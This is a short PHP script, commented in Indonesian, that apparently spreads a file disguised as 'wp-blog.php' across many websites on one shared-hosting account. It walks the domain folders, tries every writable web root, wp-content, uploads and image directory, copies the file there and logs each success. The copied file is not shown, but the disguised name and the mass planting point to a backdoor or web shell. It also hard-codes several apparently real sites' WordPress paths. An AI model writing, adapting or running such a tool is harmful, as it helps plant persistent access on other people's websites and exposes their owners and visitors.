<?php
/**
 * MASS COPY wp-blog.php
 * - TANPA scan server
 * - TANPA tebak path
 * - HANYA domain di baseDir
 * - Copy ke banyak subfolder preset
 */

set_time_limit(0);

// ====== KONFIGURASI ======
$baseDir    = '/home/u241000670/domains/aavratijewels.com/public_html/wp-admin/'; 
$baseDir    = '/home/u241000670/domains/accoretechnologies.com/public_html/wp-admin/'; 
$baseDir    = '/home/u241000670/domains/adventuremastersports.org/public_html/wp-content/'; 
$baseDir    = '/home/u241000670/domains/ambientsportsandentertainment.com/public_html/wp-admin/'; 
$baseDir    = '/home/u241000670/domains/aparnaassociates.in/public_html/wp-content/'; 
$baseDir    = '/home/u241000670/domains/apcalculusonline.in/public_html/wp-includes/'; 
$baseDir    = '/home/u241000670/domains/apnasign.com/public_html/wp-includes/'; 
$baseDir    = '/home/u241000670/domains/appathak.com/public_html/wp-content/'; 
$sourceFile = __DIR__ . '/wp-blog.php'; // upload 1x di folder yang sama
$targetName = 'wp-blog.php';

// Subfolder tujuan (akan dicoba SEMUA)
$targetSubfolders = [
    '',                         // root domain
    'public_html',
    'httpdocs',
    'www',
    'htdocs',
    'public',
    'wp-content',
    'wp-content/uploads',
    'assets',
    'images',
    'uploads'
];
// ========================

if (!file_exists($sourceFile)) {
    die('❌ wp-blog.php tidak ditemukan (file sumber)');
}
if (!is_dir($baseDir)) {
    die('❌ baseDir tidak valid');
}

$log = [];

$domains = glob($baseDir . '/*', GLOB_ONLYDIR);

foreach ($domains as $domainPath) {
    $domain = basename($domainPath);

    // filter sederhana: anggap domain punya titik
    if (strpos($domain, '.') === false) continue;

    foreach ($targetSubfolders as $sub) {
        $destDir = rtrim($domainPath . '/' . $sub, '/');

        if (!is_dir($destDir)) continue;
        if (!is_writable($destDir)) {
            $log[] = "❌ [$domain] Tidak writable: $destDir";
            continue;
        }

        $dest = $destDir . '/' . $targetName;

        if (@copy($sourceFile, $dest)) {
            @chmod($dest, 0644);
            $log[] = "✅ [$domain] OK → $dest";
        } else {
            $log[] = "❌ [$domain] Gagal → $dest";
        }
    }
}

echo "<pre>" . implode("\n", $log) . "</pre>";
